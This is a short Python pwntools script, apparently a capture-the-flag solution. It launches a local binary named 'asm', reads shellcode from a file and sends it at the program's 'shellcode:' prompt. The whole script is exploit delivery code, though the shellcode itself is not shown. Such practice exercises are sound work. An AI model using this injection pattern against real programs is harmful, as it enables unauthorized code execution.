from pwn import *

p = process('./asm')

with open('shellcode.bin', 'rb') as f:
    payload = f.read()


p.sendlineafter(b'shellcode:', payload)
# p.interactive()

print(p.recvline())
